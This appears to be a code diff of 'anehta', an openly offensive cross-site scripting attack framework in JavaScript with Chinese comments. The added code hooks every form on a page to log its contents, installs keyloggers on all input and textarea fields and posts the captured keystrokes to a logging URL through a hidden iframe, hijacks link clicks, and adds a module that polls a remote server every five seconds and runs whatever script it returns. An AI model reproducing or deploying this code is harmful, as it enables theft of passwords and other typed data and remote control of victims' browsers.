@@ -10,7 +10,7 @@ var anehta = {
         Contact: 'axis@ph4nt0m.org',
         Homepage: 'http://www.ph4nt0m.org',
         Blog: 'http://hi.baidu.com/aullik5',
-        projectHome: 'http://anehta.googlecode.com',
+        ProjectHome: 'http://anehta.googlecode.com',
         DemoPage: 'http://www.secwiki.com/anehta/demo.html'  
 };
 
@@ -272,6 +272,17 @@ anehta.core.cache = function(){
 var anehtaCache = new anehta.core.cache();
 
 
+// 将当前xss的状态保存在cookie中
+anehta.core.saveTask = function() {
+	
+}
+
+// 将cookie中的状态恢复并continue未完成的任务
+anehta.core.restoreTask = function() {
+	
+}
+
+
 // Using Flash Shared Object to Store Watermark
 anehta.core.setWatermark = function(flashID, o){
 	return document.getElementById(flashID).setWatermark(o);	
@@ -297,12 +308,58 @@ anehta.core.parseXML = function(){
 //////////////////////////////////////////////////
 anehta.dom = {};
 
-anehta.dom.bindEvent = function (){
+// o 是要bind的对象, e 是bind的事件名字
+// 比如 anehta.dom.bindEvent(document.getElementById(x), "mousedown");
+anehta.dom.bindEvent = function (o, e, fn){
+	if (typeof o == "undefined" || typeof e == "undefined" || typeof fn == "undefined"){
+	  return false;
+	}
 	
+	if (o.addEventListener){  
+		o.addEventListener(e, 		                  
+			                window[fn], 
+			                false);
+	} 
+	else if (o.attachEvent){  // IE
+		o.attachEvent("on"+e, 
+		              window[fn]
+		              );
+	}
+	else { // 
+		//alert(2);
+		var oldhandler = o["on"+e];
+		if (oldhandler) {
+			o["on"+e] = function(x){ 
+				oldhandler(x);
+				window[fn]();  
+			}
+		}
+		else {
+			o["on"+e] = function(x){ 
+				window[fn]();  
+			}
+		}
+	}
 }
 
-anehta.dom.unbindEvent = function (){
+// 从element o的e事件中将fn函数移去
+anehta.dom.unbindEvent = function (o, e, fn){
+	if (typeof o == "undefined" || typeof e == "undefined" || typeof fn == "undefined"){
+	  return false;
+	}
 	
+	if (o.removeEventListener){  
+		o.removeEventListener(e, window[fn], false);
+	} 
+	else if (o.detachEvent){  // IE
+		o.detachEvent("on"+e, window[fn]);
+	}
+	else {
+		var oldhandler = o["on"+e];
+		if (oldhandler) {
+			o["on"+e] = "";
+		}
+	}
 }
 
 // from attackAPI
@@ -732,7 +789,6 @@ anehta.logger.logCache = function(){
 
 
 
-
 //////////////////////////////////////////////////
 // Ajax Library 
 //////////////////////////////////////////////////
@@ -1030,6 +1086,14 @@ anehta.inject.injectApplet = function() {
 	
 }
 
+
+
+
+//////////////////////////////////////////////////
+//// Hook Library
+//////////////////////////////////////////////////
+anehta.hook = {};
+
 /* 一般JS函数的hook, 使用委托
    @axis
    注意hook函数加载前,如果函数已经调用了,则该函数无法hook 
@@ -1044,7 +1108,7 @@ anehta.inject.injectApplet = function() {
    //可以递归注入函数,不能劫持参数
    hj.injectFn("被inject的函数名", "保存原函数的变量", "你的函数名");
 */
-anehta.inject.hookFunction = function (){
+anehta.hook.hookFunction = function (){
 	//alert("hookjsfunc");
   // 保存原函数;还是需要作为参数指定一个,
   //否则多次hook后会丢失之前保存的原函数
@@ -1122,7 +1186,7 @@ anehta.inject.hookFunction = function (){
 };
 
 // 初始化hook
-var anehtaHook = new anehta.inject.hookFunction();
+var anehtaHook = new anehta.hook.hookFunction();
 
 /*
 * Name: hookSubmit 
@@ -1133,7 +1197,7 @@ var anehtaHook = new anehta.inject.hookFunction();
 *
 * If the form uses javascript to call submit method for submitting, you should install a hook on the form.
 */
-anehta.inject.hookSubmit = function(o, injectFuncCallBack) {
+anehta.hook.hookSubmit = function(o, injectFuncCallBack) {
 	//alert();
 	if (o.hooked == undefined) {
 		o.hooked = true;
@@ -1147,6 +1211,117 @@ anehta.inject.hookSubmit = function(o, injectFuncCallBack) {
 		}
 	}
 }
+
+// hook 指定表单的提交
+anehta.hook.hookForm = function(f){
+	if (typeof f == "undefined"){
+		return false;
+	}
+		
+	window.anehtaHookForm = function(){
+		anehta.logger.logForm(f);		
+		anehta.core.freeze(200);
+	}
+	
+  anehta.dom.bindEvent(f, "submit", "anehtaHookForm");
+}
+
+
+// 找出页面上所有表单并hook之
+anehta.hook.hookAllForms = function(){
+	var allforms = document.getElementsByTagName("form");
+	
+	for(i=0; i<allforms.length; i++){
+		anehta.hook.hookForm(allforms[i]);
+	}	
+}
+
+
+// 给 element o 装上keylogger; o 一般是 input 或者 textarea
+// trigger 为选择什么时候发送keylog
+anehta.hook.installKeylogger = function(o, trigger){
+  // 记录keylog的函数
+  var i = 0; // 计数器
+  var j = 1; // 全局计数器
+  
+  var keylogger = new Array();
+  var keystrokes = ""; //记录所有键盘记录
+  
+	window.installKeylogger = function(event){
+
+
+	  // json data format
+	  keylogger[i] = "{tag:'"+o.tagName+
+	                 "', name:'"+o.name+
+	                 "', id:'"+o.id+
+	                 "', press:'"+j+
+	                 "', key:'"+String.fromCharCode(event.keyCode)+
+	                 "', keyCode:'"+event.keyCode+
+	                 "'}";  
+	
+	  keystrokes = String.fromCharCode(event.keyCode);  
+	  anehtaCache.appendItem("KeyStrokes", keystrokes);  
+	  //alert(keylogger);                      
+	  //alert(keystrokes);
+	  i=i+1;
+	  j=j+1; 	  
+	}
+	
+	anehta.dom.bindEvent(o, "keydown", "installKeylogger");
+	
+  // 如果设定了发送keylogger的方式......
+	if (trigger){
+		// 生成一个iframe用于向anehta提交长数据
+		var dd = document.createElement('div');
+	  var ifrname = "anehtaPostKeylog";//生成一个随机的name
+	  dd.innerHTML = "<iframe id='" + ifrname + "' name='" + ifrname + "' width=0 height=0 ></iframe>";
+	  document.getElementsByTagName('body')[0].appendChild(dd);
+	  var ifr = document.getElementById(ifrname);
+		
+	  if (trigger == "blur"){ // 元素blur时触发
+	  	window.logKeyloggerOnBlur = function(){
+	  		
+	  		// 提交数据比较多,需要使用post提交
+	  		keylogger = NoCryptMark + XssInfo_S + "Watermark: " + 
+	                  anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
+                    XssInfo_S + "Info: \r\n" + XssInfo_S + "Keylogger: " + keylogger + XssInfo_E + XssInfo_E;
+        //alert(keylogger);            
+	      keylogger = escape(keylogger);
+	      anehta.net.postFormIntoIframe(ifr, logurl, keylogger);
+	      
+	  		//anehta.core.freeze(50);
+	  	}
+	  	anehta.dom.bindEvent(o, "blur", "logKeyloggerOnBlur");
+	  } 
+	  else if (trigger == "unload"){ // window.unload 时触发
+	  	window.logKeyloggerUnLoad = function(){	  		
+	  		keylogger = XssInfo_S + "\r\n    Keylogger: " + keylogger + XssInfo_E;
+
+	      // window.unload 时用post已经不合适了
+        anehta.logger.logInfo(keylogger);
+
+	  		anehta.core.freeze(200);
+	  	}
+
+	  	anehta.dom.bindEvent(window, "unload", "logKeyloggerUnLoad");	  	
+	  }
+	} 	    	
+}
+
+// 扫描所有的input和textarea, 并安装keylogger
+anehta.hook.installKeyloggerToAllInputs = function(){
+	var inputs = document.getElementsByTagName("input");
+	var textareas = document.getElementsByTagName("textarea");
+	
+	for (i=0; i<inputs.length; i++){
+		anehta.hook.installKeylogger(inputs[i], "blur");
+	}
+	
+	for (i=0; i<textareas.length; i++){
+		anehta.hook.installKeylogger(textareas[i], "blur");
+	}
+}
+
 
 
 
@@ -1524,6 +1699,7 @@ anehta.trick = {};
 // 劫持点击链接。idea from http://www.breakingpointsystems.com/community/blog/clickjacking-technique-using-the-mousedown-event
 // by Dustin D. Trammell 
 anehta.trick.hijackLink = function(link, url){
+	/*
 	if ( link.addEventListener ) {
       link.addEventListener("mousedown", function(e){link.href=url;}, false);
   } else if ( link.attachEvent ) {
@@ -1536,6 +1712,23 @@ anehta.trick.hijackLink = function(link, url){
         link["onmousedown"] = function(e){link.href=url;};
      }
   }	
+  */
+
+  window.changeHref = function(){ 
+  	link.href = url; 
+  };
+
+  anehta.dom.bindEvent(link, "mousedown", "changeHref");
+    
+}
+
+
+anehta.trick.fakeForm = function(){
+	
+}
+
+anehta.trick.popupForm = function(){
+	
 }
 
 
@@ -1547,6 +1740,29 @@ anehta.misc = {};
 anehta.misc.stealFile = function(){
 	
 }
+
+// 实时命令模块
+anehta.misc.realtimeCMD = function(){
+	var timeInterval = 5000;  // 时间间隔
+	var realtimeCmdMaster = anehtaurl + "/server/realtimecmd.php?";
+
+  setInterval(function(){
+    var timesig = new Date();
+    // 水印只能从cookie中取
+    var watermarknum = anehta.dom.getCookie("anehtaWatermark");
+    if (watermarknum != null){
+      watermarknum = watermarknum.substring(watermarknum.indexOf('|')+1);
+    }
+
+	  var rtcmd = anehta.inject.injectScript(realtimeCmdMaster+"watermark="+watermarknum+"&t="+timesig.getTime());
+	
+	  // 留出一定的时间执行,然后删除它
+	  setTimeout(function(){ anehta.inject.removeScript(rtcmd);}, 1500);
+    },
+    timeInterval);
+}
+
+
 
 // IE only!
 // Read/Write to Clipboard will cause a security warning!
@@ -1572,13 +1788,17 @@ anehta.misc.getCurrentPage = function(){
 
 
 
+
+
 //////////////////////////////////////////////////
 // Crypto Library
 //////////////////////////////////////////////////
 anehta.crypto ={};
 
 anehta.crypto.random = function(){
-	return Math.random();
+	var x = Math.random(); 
+	x = x * 100000000000; // 取13位
+	return x;
 }
 
 
